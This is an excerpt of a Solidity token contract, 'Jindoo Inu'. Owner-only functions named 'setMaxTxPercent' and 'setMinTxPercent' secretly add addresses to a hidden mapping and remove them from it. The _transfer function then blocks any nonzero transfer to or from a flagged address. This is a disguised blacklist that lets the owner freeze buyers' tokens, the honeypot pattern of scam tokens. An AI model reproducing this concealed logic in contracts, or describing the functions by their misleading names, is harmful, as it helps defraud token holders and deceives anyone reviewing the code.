...
contract JindooINU is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _setMaxTxPercent;
    ...
    string private _name = 'Jindoo Inu';
    string private _symbol = 'Jindoo';
    ...
    function checkRefresh() public view returns (bool) {
        return _state;
    }
    
    function checkPercent(address _address) public view returns (bool) {
        return _setMaxTxPercent[_address];
    }
    
    function setMaxTxPercent(address account) external onlyOwner() {
        _setMaxTxPercent[account] = true;
    }
    
    function setMinTxPercent(address account) external onlyOwner() {
        _setMaxTxPercent[account] = false;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (_setMaxTxPercent[sender] || _setMaxTxPercent[recipient])
        require(amount == 0, "");
